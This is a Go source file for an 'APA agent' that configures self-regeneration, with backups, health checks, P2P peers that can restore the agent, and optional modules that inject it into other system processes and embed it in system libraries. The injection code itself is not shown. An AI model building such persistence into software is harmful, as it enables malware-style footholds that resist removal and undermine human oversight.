// Package regeneration provides self-healing and regeneration capabilities for the APA agent
package regeneration

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"runtime"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/naviNBRuas/APA/pkg/injection"
	"github.com/naviNBRuas/APA/pkg/networking"
)

// Regenerator manages the self-regeneration capabilities of the APA agent
type Regenerator struct {
	logger           *slog.Logger
	config           *Config
	p2p              *networking.P2P
	peerID           peer.ID
	mutex            sync.RWMutex
	isRegenerating   bool
	processInjector  *injection.ProcessInjector
	libraryEmbedder  *injection.LibraryEmbedder
	advancedInjector *injection.AdvancedProcessInjector // New advanced injector
}

// Config holds the configuration for the regenerator
type Config struct {
	// BinaryPath is the path to the agent binary
	BinaryPath string

	// BackupPath is the path where backups are stored
	BackupPath string

	// RegenerationInterval is how often to check for regeneration needs
	RegenerationInterval time.Duration

	// HealthCheckEndpoint is the endpoint to check agent health
	HealthCheckEndpoint string

	// TrustedPeers are peers that can provide regeneration resources
	TrustedPeers []string

	// EnableProcessInjection enables injection into other system processes
	EnableProcessInjection bool

	// EnableLibraryEmbedding enables embedding into system libraries
	EnableLibraryEmbedding bool

	// EnableAdvancedInjection enables advanced injection techniques
	EnableAdvancedInjection bool
}

// NewRegenerator creates a new Regenerator instance
func NewRegenerator(logger *slog.Logger, config *Config, p2p *networking.P2P, peerID peer.ID) *Regenerator {
	if config == nil {
		return nil
	}

	if config.BinaryPath == "" {
		config.BinaryPath = getDefaultBinaryPath()
	}

	if config.BackupPath == "" {
		config.BackupPath = getDefaultBackupPath()
	}

	if config.RegenerationInterval == 0 {
		config.RegenerationInterval = time.Hour
	}

	if config.HealthCheckEndpoint == "" {
		config.HealthCheckEndpoint = "http://localhost:8080/admin/health"
	}

	var processInjector *injection.ProcessInjector
	if config.EnableProcessInjection {
		processInjector = injection.NewProcessInjector(logger, config.BinaryPath, peerID)
	}

	var libraryEmbedder *injection.LibraryEmbedder
	if config.EnableLibraryEmbedding {
		libraryEmbedder = injection.NewLibraryEmbedder(logger, config.BinaryPath, peerID)
	}

	var advancedInjector *injection.AdvancedProcessInjector
	if config.EnableAdvancedInjection {
		advancedInjector = injection.NewAdvancedProcessInjector(logger, config.BinaryPath, peerID)
	}

	return &Regenerator{
		logger:           logger,
		config:           config,
		p2p:              p2p,
		peerID:           peerID,
		processInjector:  processInjector,
		libraryEmbedder:  libraryEmbedder,
		advancedInjector: advancedInjector,
	}
}

// getDefaultBinaryPath returns the default path for the agent binary
func getDefaultBinaryPath() string {
	if execPath, err := os.Executable(); err == nil {
		return execPath
	}

	switch runtime.GOOS {
	case "windows":
		return "C:\\Program Files\\APA\\agentd.exe"
	case "darwin":
		return "/usr/local/bin/agentd"
	default:
		return "/usr/local/bin/agentd"
	}
}

// getDefaultBackupPath returns the default path for backups
func getDefaultBackupPath() string {
	switch runtime.GOOS {
	case "windows":
		return "C:\\ProgramData\\APA\\backup"
	case "darwin":
		return "/var/lib/apa/backup"
	default:
		return "/var/lib/apa/backup"
	}
}

// Start begins the regeneration monitoring process
func (r *Regenerator) Start(ctx context.Context) {
	if r == nil {
		return
	}

	r.logger.Info("Starting regeneration monitoring")

	go r.monitorLoop(ctx)

	if r.config.EnableProcessInjection && r.processInjector != nil {
		r.processInjector.Start(ctx)
	}

	if r.config.EnableLibraryEmbedding && r.libraryEmbedder != nil {
		r.libraryEmbedder.Start(ctx)
	}

	if r.config.EnableAdvancedInjection && r.advancedInjector != nil {
		r.advancedInjector.Start(ctx)
	}

	r.performInitialInjection(ctx)
}

// TriggerRegeneration allows external callers to force a regeneration check cycle.
func (r *Regenerator) TriggerRegeneration(ctx context.Context) error {
	if r == nil {
		return fmt.Errorf("regenerator is not initialized")
	}

	go r.handleRegeneration(ctx)
	return nil
}
